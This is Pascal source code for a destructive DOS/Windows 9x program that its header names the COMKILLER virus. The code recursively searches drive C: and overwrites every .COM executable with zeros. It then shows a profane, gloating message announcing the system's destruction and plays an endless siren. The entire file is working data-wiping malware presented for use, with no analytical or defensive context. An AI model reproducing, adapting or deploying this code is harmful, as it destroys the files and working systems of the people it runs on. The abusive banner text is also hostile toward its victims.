(***************************************************************)
(*   _____ ____  __  __ _  _______ _      _      ______ _____  *)
(*  / ____/ __ \|  \/  | |/ /_   _| |    | |    |  ____|  __ \ *)
(* | |   | |  | | \  / | ' /  | | | |    | |    | |__  | |__) |*)
(* | |   | |  | | |\/| |  <   | | | |    | |    |  __| |  _  / *)
(* | |___| |__| | |  | | . \ _| |_| |____| |____| |____| | \ \ *)
(*  \_____\____/|_|  |_|_|\_\_____|______|______|______|_|  \_\*)
(*                                                             *)
(*                      DOS/Win3.x/Win9x                       *)
(*                        V  I  R  U  S                        *)
(*                      CODED BY N4RK0Z4                       *)
(*                                                             *)
(*                      DATE: 20/01/2026                       *)
(***************************************************************)

program comkiller;

uses dos, crt;

var
    counter: integer;

procedure Overwrite(filename: string);
var
    f: file;
    buffer: array[1..512] of byte;
    i: integer;
begin
    { Wypelnij bufor zerami }
    FillChar(buffer, SizeOf(buffer), 0);
  
    Assign(f, filename);
    {$I-}
    Rewrite(f, 1);
    {$I+}
  
    if IOResult = 0 then
    begin
        { Nadpisz plik zerami }
        BlockWrite(f, buffer, SizeOf(buffer));
        Close(f);
        Inc(counter);
    end;
end;

procedure SearchAndKill(Path: string);
var
    DirInfo: SearchRec;
    fullPath: string;
begin
    if (Length(Path) > 0) and (Path[Length(Path)] <> '\') then
        Path := Path + '\';
  
    { Szukaj plikow .COM }
    FindFirst(Path + '*.COM', AnyFile, DirInfo);
    while DosError = 0 do
    begin
        if (DirInfo.Attr and Directory) = 0 then
            Overwrite(Path + DirInfo.Name);
        FindNext(DirInfo);
    end;
  
    { Przeszukaj podkatalogi }
    FindFirst(Path + '*.*', Directory, DirInfo);
    while DosError = 0 do
    begin
        if ((DirInfo.Attr and Directory) <> 0) and 
            (DirInfo.Name <> '.') and (DirInfo.Name <> '..') then
        begin
            fullPath := Path + DirInfo.Name;
            SearchAndKill(fullPath);
        end;
        FindNext(DirInfo);
    end;
end;

procedure PlaySiren;
var
    freq: integer;
begin
    repeat
        for freq := 400 to 1200 do
        begin
            Sound(freq);
            Delay(1);
        end;

        for freq := 1200 downto 400 do
        begin
            Sound(freq);
            Delay(1);
        end;
    until false;
    NoSound;
end;

begin
    (**************** TOTALNA ROZPIERDUCHA ****************)

    counter := 0;
    SearchAndKill('C:');
    ClrScr;
    TextColor(Yellow);
    writeln('   _____ ____  __  __ _  _______ _      _      ______ _____   ');
    writeln('  / ____/ __ \|  \/  | |/ /_   _| |    | |    |  ____|  __ \  ');
    writeln(' | |   | |  | | \  / |   /  | | | |    | |    | |__  | |__ |  ');
    writeln(' | |   | |  | | |\/| |  <   | | | |    | |    |  __| |  _  /  ');
    writeln(' | |___| |__| | |  | | . \ _| |_| |____| |____| |____| | \ \  ');
    writeln('  \_____\____/|_|  |_|_|\_\_____|______|______|______|_|  \_\ ');
    writeln('                      V   I   R   U   S                       ');
    writeln('                      CODED BY N4RK0Z4                        ');
    writeln('                                                              ');
    TextColor(White);
    writeln('                    !!! W A R N I N G !!!                     ');
    writeln('        YOUR SYSTEM HAS BEEN DESTROYED BY COMKILLER!          ');
    writeln('         REBOOT YOUR SYSTEM AND ENJOY MOTHERFUCKER!           ');
    writeln('                                                              ');
    writeln('                      BUHAHAHAHAHAHAHA                        ');

    PlaySiren; { GRAJ SYRENE }

    (************ F U C K  Y O U  B I T C H E S ***********)
    (******************************************************)
end.